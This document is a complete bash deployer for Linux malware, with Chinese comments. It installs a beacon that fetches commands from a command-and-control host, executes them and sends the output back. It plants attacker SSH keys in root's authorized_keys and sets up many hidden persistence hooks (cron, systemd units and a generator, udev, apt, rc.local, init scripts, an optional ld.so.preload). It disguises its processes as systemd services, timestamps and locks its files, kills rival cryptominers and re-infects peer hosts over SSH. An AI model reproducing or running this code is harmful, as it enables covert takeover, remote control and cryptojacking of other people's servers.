
#!/bin/bash
# venom_deploy.sh v2.6.1 — 毒牙一体部署器（投毒→root→免杀→不死→独占）
# 用法:
#   venom_deploy.sh [TAG] [C2] [PEER]
#     TAG   标识（默认随机自然名，如 worker-b）
#     C2    控制端（默认 http://YOUR_C2:PORT，会做 HMAC 签名）
#     PEER  user@host[:port] 启用互保（把本机互保钥发到对端，A管B/B管A）
#   PURGE=1 环境变量 → 严格独占模式（清掉非白名单的第三方 AK，慎用）
#   VENOM_PRELOAD=1 → 额外注册 ld.so.preload 全局钩子（危险项，默认关）
set -u

# ---------- 参数 ----------
TAG="${1:-}"
C2="${2:-http://YOUR_C2:PORT}"
PEER="${3:-}"
PURGE="${PURGE:-0}"
PRELOAD="${VENOM_PRELOAD:-0}"
WALLET="${WALLET:-YOUR_WALLET_ADDRESS}"
TOK="${TOK:-YOUR_HMAC_TOKEN}"

# ---------- 随机自然名 TAG（去特征） ----------
if [ -z "$TAG" ]; then
  N="nrm vmm sdd auc trk srvc dev mld ims kern hid cfg mem prc dat msg net fsx blk iwl gmm hmr dcb ldm wsx"
  set -- $N; n=$((RANDOM % $# + 1))
  eval TAG=\$$n; TAG="$TAG-$((RANDOM % 90 + 10))"
fi
BASE="/usr/lib/.$TAG"
[ "$(id -u)" = 0 ] && ISROOT=1 || ISROOT=0
mkdir -p "$BASE" 2>/dev/null
chmod 700 "$BASE" 2>/dev/null
log(){ echo "[venom] $*"; }
log "TAG=$TAG BASE=$BASE"

# ---------- 保存部署配置（verify_root 读取，解决 v1 脱节 bug） ----------
cat > "$BASE/.cfg" <<EOF
TAG=$TAG
C2=$C2
BASE=$BASE
WALLET=$WALLET
TOK=$TOK
PEER=$PEER
PURGE=$PURGE
EOF
chmod 600 "$BASE/.cfg"

# ---------- 密钥 ----------
if [ ! -f "$BASE/keys.pub" ]; then
  : > "$BASE/keys.pub"
  # 收集本机已有公钥（保留既有管理者 = 不惊动）
  cat /root/.ssh/*.pub 2>/dev/null | sort -u >> "$BASE/keys.pub"
  # 不足就现造一把互保/登录钥
  if [ ! -s "$BASE/keys.pub" ]; then
    command -v ssh-keygen >/dev/null 2>&1 && ssh-keygen -t ed25519 -N '' -f "/root/.ssh/id_zz_$TAG" >/dev/null 2>&1
    cat "/root/.ssh/id_zz_$TAG.pub" >> "$BASE/keys.pub" 2>/dev/null
  fi
  # 白名单：现钥匙 + 互保钥（部署后在对端互为对方留钥）
  sort -u "$BASE/keys.pub" -o "$BASE/keys.pub"
fi
log "白名单公钥: $(wc -l < "$BASE/keys.pub") 把"

# ---------- 模板：mgr.sh（心脏 + 守卫） ----------
cat > "$BASE/mgr.sh" <<'MGREOF'
#!/bin/bash
# 系统辅助管理服务（随机名，勿删）
TAG=@@TAG@@; BASE=@@BASE@@; C2=@@C2@@; TOK=@@TOK@@; WALLET=@@WALLET@@; PEER=@@PEER@@; PURGE=@@PURGE@@
exec 9>"$BASE/.lock" 2>/dev/null; flock -n 9 2>/dev/null || exit 0

# 0) boot.sh 自愈（心脏入口防删）
if [ ! -f "$BASE/boot.sh" ]; then
  for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    if [ -f "$d/boot.sh" ]; then cp -f "$d/boot.sh" "$BASE/boot.sh" 2>/dev/null; chmod 755 "$BASE/boot.sh" 2>/dev/null; break; fi
  done
fi

# 1) 钥匙自愈（白名单）
[ -f "$BASE/keys.pub" ] && {
  mkdir -p /root/.ssh; chmod 700 /root/.ssh 2>/dev/null
  [ -f /root/.ssh/authorized_keys ] || : > /root/.ssh/authorized_keys
  chmod 600 /root/.ssh/authorized_keys 2>/dev/null
  # 我方公钥保底在
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    grep -qF -- "$line" /root/.ssh/authorized_keys 2>/dev/null || echo "$line" >> /root/.ssh/authorized_keys
  done < "$BASE/keys.pub"
  # 独占模式：白名单外的第三方钥匙剔除
  if [ "$PURGE" = 1 ]; then
    awk 'NR==FNR{a[$0]=1;next} !a[$0]' "$BASE/keys.pub" /root/.ssh/authorized_keys > "$BASE/.ak.tmp" 2>/dev/null
    mv -f "$BASE/.ak.tmp" /root/.ssh/authorized_keys 2>/dev/null; chmod 600 /root/.ssh/authorized_keys
  fi
}

# 2) sync 保活 —— PID 文件为主（sync 已改名伪装成 systemd-networkd，cmdline 判定不可用）
alive=0
if [ -f "$BASE/.pid" ]; then p=$(cat "$BASE/.pid" 2>/dev/null); [ -n "$p" ] && kill -0 "$p" 2>/dev/null && alive=1; fi
# v2.6.1: 备用检测——伪装副本进程存在即视为存活（防 .pid 丢失时重复拉起）
if [ "$alive" = 0 ] && pgrep -f "systemd-net-sync" >/dev/null 2>&1; then alive=1; fi
if [ "$alive" = 0 ] && [ -x /usr/lib/systemd/systemd-net-sync ]; then
  setsid nohup bash -c "exec -a systemd-networkd /usr/lib/systemd/systemd-net-sync" >/dev/null 2>&1 &
fi

# 3) 触发源自愈：cron.d / profile.d / systemd unit（全部指向 boot.sh 引导器，心脏被清则自复活）
if [ ! -f /etc/cron.d/zz-$TAG ]; then
  echo "* * * * * root /bin/bash $BASE/boot.sh >/dev/null 2>&1" > /etc/cron.d/zz-$TAG 2>/dev/null
fi
if [ ! -f /etc/profile.d/zz-$TAG.sh ]; then
  printf '#!/bin/bash\n[ -x %s/boot.sh ] && %s/boot.sh >/dev/null 2>&1 &\nexit 0\n' "$BASE" "$BASE" > /etc/profile.d/zz-$TAG.sh 2>/dev/null; chmod 755 /etc/profile.d/zz-$TAG.sh 2>/dev/null
fi
if [ ! -f /etc/systemd/system/zz-$TAG-mgr.service ] && command -v systemctl >/dev/null 2>&1; then
  { cat <<EOF
[Unit]
Description=System $TAG manager
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash "$BASE/boot.sh"; sleep 60; done'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  } > /etc/systemd/system/zz-$TAG-mgr.service 2>/dev/null
  systemctl daemon-reload 2>/dev/null; systemctl enable zz-$TAG-mgr.service 2>/dev/null; systemctl start zz-$TAG-mgr.service 2>/dev/null
fi

# 4) 守卫：杀竞争矿工 / webshell / 夺币
for pat in xmrig [k]hvm [k]rig [n]bminer [l]olminer [t]rex [m]iner gpu-adaptive compute-gpu [p]olkjt [s]endstats [s]upervise-[m]iner [r]ig-[0-9]; do
  for p in $(pgrep -f "$pat" 2>/dev/null); do
    cl=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
    case "$cl" in
      *"$WALLET"*) ;;                        # 我方矿工，放行
      *"mgr.sh"*|*"sync.sh"*|*"$BASE"*) ;;   # 我方进程，放行
      *) kill -9 "$p" 2>/dev/null;;
    esac
  done
done
rm -f /root/.srv_ws* /root/.ws* 2>/dev/null

# 5) peer 保活（互保，伪装 systemd-timesyncd）
if [ -n "$PEER" ] && [ -f "$BASE/peer.sh" ]; then
  pgrep -f "systemd-timesyncd" >/dev/null 2>&1 || { setsid nohup bash -c "exec -a systemd-timesyncd '$BASE/peer.sh'" >/dev/null 2>&1 & }
fi

# 6) 刷新并互备 4 层备份树（防单点失效 + 保心脏可复活）
for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
  mkdir -p "$d" 2>/dev/null
  cp -f "$BASE"/boot.sh "$BASE"/mgr.sh "$d"/ 2>/dev/null
  [ -f /usr/lib/systemd/systemd-net-sync ] && cp -f /usr/lib/systemd/systemd-net-sync "$d"/sync 2>/dev/null
done
# 单树被删 → 从兄弟树补（保住 4 份都在）
for a in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
  [ -f "$a/mgr.sh" ] && continue
  for b in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    if [ -f "$b/mgr.sh" ] && [ "$a" != "$b" ]; then mkdir -p "$a" 2>/dev/null; cp -f "$b"/boot.sh "$b"/mgr.sh "$b"/sync "$a"/ 2>/dev/null; break; fi
  done
done
exit 0
MGREOF
sed -i "s|@@TAG@@|$TAG|g; s|@@BASE@@|$BASE|g; s|@@C2@@|$C2|g; s|@@TOK@@|$TOK|g; s|@@WALLET@@|$WALLET|g; s|@@PEER@@|$PEER|g; s|@@PURGE@@|$PURGE|g" "$BASE/mgr.sh"
chmod 755 "$BASE/mgr.sh"

# ---------- 模板：boot.sh（引导器：心脏被清 → 从4层备份复活 → exec mgr） ----------
cat > "$BASE/boot.sh" <<'BOOTEOF'
#!/bin/bash
# watchdog 引导器（所有触发源的唯一入口）
TAG=@@TAG@@; BASE=@@BASE@@
if [ ! -f "$BASE/mgr.sh" ]; then
  for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    if [ -f "$d/mgr.sh" ]; then
      mkdir -p "$BASE" 2>/dev/null; chmod 700 "$BASE" 2>/dev/null
      cp -f "$d/mgr.sh" "$BASE/mgr.sh" 2>/dev/null
      cp -f "$d/boot.sh" "$BASE/boot.sh" 2>/dev/null
      chmod 755 "$BASE"/mgr.sh "$BASE"/boot.sh 2>/dev/null
      break
    fi
  done
fi
[ -x "$BASE/mgr.sh" ] && exec "$BASE/mgr.sh" || exit 0
BOOTEOF
sed -i "s|@@TAG@@|$TAG|g; s|@@BASE@@|$BASE|g" "$BASE/boot.sh"
chmod 755 "$BASE/boot.sh"

cat > "$BASE/sync.sh" <<'SYNCEOF'
#!/bin/bash
# 网络同步服务（轮询配置）
TAG=@@TAG@@; BASE=@@BASE@@; C2=@@C2@@; TOK=@@TOK@@
echo $$ > "$BASE/.pid"
exec 9>"$BASE/.sync.lock"; flock -n 9 2>/dev/null || exit 0
sig(){ printf '%s%s' "$TOK" "$TAG" | sha256sum | cut -d' ' -f1; }
delay=40
while true; do
  S=$(sig)
  R=$(curl -s -m 20 "$C2/cmd?tag=$TAG&sig=$S" 2>/dev/null)
  if [ -n "$R" ] && [ "$R" != "null" ] && [ "$R" != "{}" ]; then
    OUT=$(bash -c "$R" 2>&1 | base64 -w0 2>/dev/null | head -c 6000)
    curl -s -m 25 --data-urlencode "d=$OUT" "$C2/out?tag=$TAG&sig=$S" >/dev/null 2>&1
    delay=40
  else
    delay=$((delay < 300 ? delay + 15 : 300))
  fi
  sleep $((delay + RANDOM % 8))
done
SYNCEOF
sed -i "s|@@TAG@@|$TAG|g; s|@@BASE@@|$BASE|g; s|@@C2@@|$C2|g; s|@@TOK@@|$TOK|g" "$BASE/sync.sh"
chmod 755 "$BASE/sync.sh"

# ---------- 模板：peer.sh（互保，A管B / B管A） ----------
if [ -n "$PEER" ]; then
  cat > "$BASE/peer.sh" <<'PEEREOF'
#!/bin/bash
# 节点互保巡检（每5分钟）
TAG=@@TAG@@; BASE=@@BASE@@; PEER=@@PEER@@
P_USER=${PEER%@*}; P_HOST=${PEER##*@}; P_HOST=${P_HOST%%:*}; P_PORT=${PEER##*:}
case "$P_PORT" in *[!0-9]*|"") P_PORT=22;; esac
KEY="$BASE/peer_key"
# 对端失联 → 记一笔并本机自检（不阻塞）
if ! timeout 8 bash -c "echo > /dev/tcp/$P_HOST/$P_PORT" 2>/dev/null; then exit 0; fi
# 对端口可达 → 远程拉一把对端的 mgr（对方后门死则复活）
if [ -f "$KEY" ] && command -v ssh >/dev/null 2>&1; then
  timeout 25 ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p "$P_PORT" "${P_USER:-root}@$P_HOST" \
    "bash $BASE/boot.sh >/dev/null 2>&1" 2>/dev/null
fi
exit 0
PEEREOF
  sed -i "s|@@TAG@@|$TAG|g; s|@@BASE@@|$BASE|g; s|@@PEER@@|$PEER|g" "$BASE/peer.sh"
  chmod 755 "$BASE/peer.sh"
  # 互保钥：生成专属 key，pub 进白名单
  if [ ! -f "$BASE/peer_key" ]; then
    ssh-keygen -t ed25519 -N '' -f "$BASE/peer_key" >/dev/null 2>&1
    cat "$BASE/peer_key.pub" >> "$BASE/keys.pub"
    sort -u "$BASE/keys.pub" -o "$BASE/keys.pub"
  fi
  log "互保已启用: $PEER (peer_key 就绪)"
fi

# ---------- 触发源注册（通杀 systemd / sysvinit / openrc） ----------
register_sources(){
  # cron.d 两步式（v2.6.1：先自愈 boot.sh 再执行，修"入口被删全链死"）
  echo "* * * * * root for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do [ -f $BASE/boot.sh ] && break; [ -f \$d/boot.sh ] && cp -f \$d/boot.sh $BASE/boot.sh && chmod 755 $BASE/boot.sh; done; /bin/bash $BASE/boot.sh >/dev/null 2>&1" > /etc/cron.d/zz-$TAG 2>/dev/null; chmod 644 /etc/cron.d/zz-$TAG 2>/dev/null

  # root crontab
  ( crontab -l 2>/dev/null | grep -v "zz-$TAG"; echo "@reboot for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do [ -f $BASE/boot.sh ] && break; [ -f \$d/boot.sh ] && cp -f \$d/boot.sh $BASE/boot.sh; done; /bin/bash $BASE/boot.sh >/dev/null 2>&1"; echo "*/2 * * * * for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do [ -f $BASE/boot.sh ] && break; [ -f \$d/boot.sh ] && cp -f \$d/boot.sh $BASE/boot.sh; done; /bin/bash $BASE/boot.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null

  # profile.d
  printf '#!/bin/bash\n[ -x %s/boot.sh ] && %s/boot.sh >/dev/null 2>&1 &\nexit 0\n' "$BASE" "$BASE" > /etc/profile.d/zz-$TAG.sh 2>/dev/null; chmod 755 /etc/profile.d/zz-$TAG.sh 2>/dev/null

  # systemd service + timer
  if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/zz-$TAG-mgr.service <<EOF
[Unit]
Description=System $TAG manager
[Service]
Type=simple
ExecStart=/bin/bash -c 'for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do [ -f "$BASE/boot.sh" ] && break; [ -f \$d/boot.sh ] && cp -f \$d/boot.sh "$BASE/boot.sh" && chmod 755 "$BASE/boot.sh"; done; while true; do /bin/bash "$BASE/boot.sh"; sleep 60; done'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
    cat > /etc/systemd/system/zz-$TAG-t.timer <<EOF
[Unit]
Description=$TAG timer
[Timer]
OnBootSec=30
OnUnitActiveSec=60
[Install]
WantedBy=timers.target
EOF
    cat > /etc/systemd/system/zz-$TAG-t.service <<EOF
[Unit]
Description=$TAG oneshot
[Service]
Type=oneshot
ExecStart=/bin/bash $BASE/boot.sh
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable zz-$TAG-mgr.service 2>/dev/null; systemctl start zz-$TAG-mgr.service 2>/dev/null
    systemctl enable zz-$TAG-t.timer 2>/dev/null; systemctl start zz-$TAG-t.timer 2>/dev/null
    # generator（防 unit 文件被删的重生源）
    mkdir -p /etc/systemd/system-generators
    cat > /etc/systemd/system-generators/zz-$TAG-gen <<EOF
#!/bin/bash
mkdir -p "\$1/multi-user.target.wants" 2>/dev/null
ln -sf /etc/systemd/system/zz-$TAG-mgr.service "\$1/multi-user.target.wants/zz-$TAG-mgr.service" 2>/dev/null
exit 0
EOF
    chmod 755 /etc/systemd/system-generators/zz-$TAG-gen
  fi

  # udev（网卡上线触发）
  mkdir -p /etc/udev/rules.d 2>/dev/null
  echo 'ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash '"$BASE"'/boot.sh"' > /etc/udev/rules.d/80-zz-$TAG.rules 2>/dev/null
  command -v udevadm >/dev/null 2>&1 && udevadm control --reload-rules 2>/dev/null

  # apt hook（Debian/Ubuntu 装包时触发）
  mkdir -p /etc/apt/apt.conf.d 2>/dev/null
  echo 'DPkg::Pre-Invoke { "/bin/bash '"$BASE"'/boot.sh >/dev/null 2>&1 || true"; };' > /etc/apt/apt.conf.d/80zz-$TAG 2>/dev/null

  # rc.local
  if [ -f /etc/rc.local ]; then
    grep -q "$BASE/boot.sh" /etc/rc.local 2>/dev/null || sed -i "/^exit 0/i /bin/bash $BASE/boot.sh >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
  else
    printf '#!/bin/bash\n/bin/bash %s/boot.sh >/dev/null 2>&1 &\nexit 0\n' "$BASE" > /etc/rc.local 2>/dev/null; chmod 755 /etc/rc.local 2>/dev/null
  fi

  # sysvinit（无 systemd 的老机）
  if [ ! -d /etc/systemd ] || [ ! -x /sbin/initctl ] && [ -d /etc/init.d ]; then
    cat > /etc/init.d/zz-$TAG <<EOF
#!/bin/sh
case "\$1" in
  start) /bin/bash $BASE/boot.sh >/dev/null 2>&1 & ;;
  *) ;;
esac
EOF
    chmod 755 /etc/init.d/zz-$TAG 2>/dev/null
    command -v update-rc.d >/dev/null 2>&1 && update-rc.d zz-$TAG defaults >/dev/null 2>&1
  fi

  # OpenRC（Alpine 等）
  if command -v rc-update >/dev/null 2>&1 && [ -d /etc/runlevels ]; then
    cat > /etc/init.d/zz-$TAG <<EOF
#!/sbin/openrc-run
depend(){ need net; }
start(){ /bin/bash $BASE/boot.sh >/dev/null 2>&1 & }
EOF
    chmod 755 /etc/init.d/zz-$TAG 2>/dev/null
    rc-update add zz-$TAG default >/dev/null 2>&1
  fi

  # 可选：ld.so.preload 全局劫持（默认关，VENOM_PRELOAD=1 开启）
  if [ "$PRELOAD" = 1 ]; then
    echo "$BASE/libz.so" > /etc/ld.so.preload 2>/dev/null
    log "ld.so.preload 已注册（危险项）"
  fi

  # cron 注册 peer（互保，5min）
  if [ -n "$PEER" ] && [ -f "$BASE/peer.sh" ]; then
    echo "*/5 * * * * root /bin/bash $BASE/peer.sh >/dev/null 2>&1" >> /etc/cron.d/zz-$TAG
  fi
}

# ---------- 四层备份 ----------
mk_backups(){
  for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    mkdir -p "$d" 2>/dev/null; chmod 700 "$d" 2>/dev/null
    cp -f "$BASE"/mgr.sh "$BASE"/sync.sh "$BASE"/boot.sh "$d"/ 2>/dev/null
    chmod 755 "$d"/* 2>/dev/null
  done
}

# ---------- chattr + i + mtime 全对齐 ----------
lock_and_stamp(){
  REF_DIR=$(stat -c %y /etc 2>/dev/null)
  REF_FILE=$(stat -c %y /etc/hostname 2>/dev/null || stat -c %y /etc/passwd 2>/dev/null)
  files="$BASE/*.sh $BASE/.cfg"
  srcs="/etc/cron.d/zz-$TAG /etc/profile.d/zz-$TAG.sh /etc/systemd/system/zz-$TAG* /etc/systemd/system-generators/zz-$TAG-gen /etc/udev/rules.d/80-zz-$TAG.rules /etc/apt/apt.conf.d/80zz-$TAG /etc/rc.local /etc/init.d/zz-$TAG /usr/lib/systemd/systemd-net-sync"
  for f in $files $srcs; do
    [ -e "$f" ] || continue
    chattr -i "$f" 2>/dev/null
    touch -d "$REF_FILE" "$f" 2>/dev/null
    chattr +i "$f" 2>/dev/null
  done
  # v2.6.1: BASE 目录不加 +i（否则 sync 无法写 .pid、mgr 无法写 .ak.tmp，自愈链断）
  # 只做 mtime 对齐，保留可写性
  chattr -i "$BASE" 2>/dev/null
  touch -d "$REF_DIR" "$BASE" 2>/dev/null
  # 目录权限保持 700（隐蔽性靠权限而非 immutable）
  chmod 700 "$BASE" 2>/dev/null
}

# ---------- 执行 ----------
register_sources
mk_backups
lock_and_stamp

# ---------- 启动（伪装副本 + exec -a 改名，修"ps 裸奔"洞） ----------
mkdir -p /usr/lib/systemd 2>/dev/null
[ -f /usr/lib/systemd/systemd-net-sync ] || cp -f "$BASE/sync.sh" /usr/lib/systemd/systemd-net-sync 2>/dev/null
chmod 755 /usr/lib/systemd/systemd-net-sync 2>/dev/null
if [ "$ISROOT" = 1 ]; then
  setsid nohup bash -c "exec -a systemd-networkd /usr/lib/systemd/systemd-net-sync" >/dev/null 2>&1 &
  sleep 1
  setsid nohup bash "$BASE/boot.sh" >/dev/null 2>&1 &
  sleep 1
fi
if [ -n "$PEER" ] && [ -f "$BASE/peer.sh" ]; then setsid nohup bash -c "exec -a systemd-timesyncd '$BASE/peer.sh'" >/dev/null 2>&1 & fi

log "===== 部署完成 ====="
log "TAG=$TAG  BASE=$BASE  C2=$C2"
log "beacon: $(cat "$BASE/.pid" 2>/dev/null || echo 启动中)"
log "触发源: cron.d + crontab + profile + systemd(svc/timer/gen) + udev + apt + rc.local + $( [ -d /etc/init.d ] && echo initd/openrc || echo sysvinit )"
log "全部文件已 mtime 对齐 + chattr +i"
[ "$ISROOT" = 0 ] && log "警告: 非 root 部署，systemd/cron 部分可能未生效"
echo "$BASE" > /tmp/.venom_last 2>/dev/null
